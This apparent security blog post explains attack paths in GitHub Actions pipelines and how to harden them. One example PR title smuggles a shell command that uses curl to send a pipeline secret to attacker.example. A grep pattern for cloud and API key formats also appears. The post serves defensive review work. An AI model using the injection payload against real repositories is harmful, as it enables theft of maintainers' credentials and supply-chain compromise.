---
title: "CI/CD Pipeline Attacks: Hunting Secrets in GitHub Actions"
date: 2025-11-28
draft: false
tags: ["CI/CD", "GitHub Actions", "Secrets", "Supply Chain", "Cloud"]
categories: ["Pentesting"]
summary: "Build pipelines hold credentials to everything, run code from untrusted contributors, and are rarely in scope. That combination is why they get compromised."
---

Build systems are the highest-leverage target in a modern organisation. They hold deployment credentials, they can sign artifacts, and they usually have write access to whatever they deploy to. Unlike a domain controller, they are rarely treated as tier-0.

This post covers the patterns I look for when reviewing a GitHub Actions setup.

## Where the secrets live

Three places, in order of how often they leak:

**1. Workflow files.** Hardcoded values in `.github/workflows/*.yml`. Trivially found with a code search:

```bash
grep -rIn -E '(AKIA[0-9A-Z]{16}|ghp_[A-Za-z0-9]{36}|sk-[A-Za-z0-9]{32})' .github/
```

**2. Repository and organisation secrets.** Not readable through the API, but exfiltratable by anything that can modify a workflow — which is the whole problem.

**3. OIDC-issued cloud credentials.** Better by design: short-lived, no stored secret. Worth checking what that token can actually do, though, because an over-scoped trust policy reintroduces the problem.

## The dangerous triggers

Not all workflow triggers are equal. Some hand control to unprivileged actors:

| Trigger | Risk |
| --- | --- |
| `pull_request` | Untrusted code can run, but no secrets are exposed |
| `pull_request_target` | **Untrusted PR context with base-repo secrets** — dangerous combination |
| `workflow_run` | Runs in a privileged context triggered by an unprivileged one |
| `issue_comment` | Comment-triggered workflows often interpolate comment text |
| `workflow_dispatch` | Manual, but the inputs may be unsanitised |

`pull_request_target` is the classic. It was designed to let maintainers label or comment on PRs from forks, and it runs with the base repository's secrets. If the workflow then checks out and builds the PR's code, the contributor controls what executes.

## Expression injection

The other recurring bug is interpolating untrusted context into a `run:` block:

```yaml
# Vulnerable
- run: echo "Building ${{ github.event.pull_request.title }}"

# A PR titled:  "; curl https://attacker.example/$(base64 -w0 <<< "$SECRET"); #
```

The title is attacker-controlled; `${{ }}` is substituted into the shell script before it runs. The fix is to pass it through the environment instead, where it is data rather than code:

```yaml
- env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "Building $PR_TITLE"
```

This distinction — template substitution versus environment variable — is the single most common finding in Actions reviews, and it is easy to miss because both look like interpolation.

## Self-hosted runners

A self-hosted runner that accepts jobs from forks is a remote code execution primitive by design. The runner process persists between jobs, which means one malicious job can:

- read the runner's stored credentials
- modify the runner's own work directory for the next job
- reach the internal network the runner sits on

If self-hosted runners are necessary, they should be ephemeral, isolated from production networks, and never reachable by untrusted workflows. In practice, "ephemeral" is the requirement most often skipped — a runner that survives between jobs is a persistence mechanism.

## Artifact and cache poisoning

Two subtler paths:

- **Artifact upload/download** across workflow runs lets one run influence another. If a build job uploads a binary that a deploy job trusts, whoever controls the build controls the deploy.
- **Cache poisoning** works similarly: a cache key that an untrusted workflow can write is a cache that a trusted workflow may read.

Both come down to the same principle. Anywhere an untrusted job can leave data for a trusted job, there is a trust boundary that needs an explicit validation step.

## What a hardened setup looks like

- **Pin third-party actions to a commit SHA**, not a tag. Tags are mutable.
  ```yaml
  - uses: actions/checkout@8f4b7f84864484a7bf31766abe9204da3cbe65b3  # v4.1.1
  ```
- **Set `permissions:` explicitly** at the workflow level. The default `GITHUB_TOKEN` is more permissive than most workflows need:
  ```yaml
  permissions:
    contents: read
  ```
- **Prefer OIDC over stored cloud credentials**, with a trust policy restricted to a specific repository, branch, and environment.
- **Require approval for workflows touching production environments.** Environment protection rules exist for this.
- **Do not expose secrets to fork-triggered workflows.** If a workflow needs a secret, it should not run on untrusted input.

## The review habit worth building

For any repository you're assessing, the first three things to read are `.github/workflows/`, the branch protection rules, and the repository's Actions permissions. Between them they tell you who can execute code in a privileged context — and that is the question that determines the impact of everything else you find.

The pipeline is deployed code plus credentials plus an internet-facing trigger. Treat it the way you'd treat a jump host.
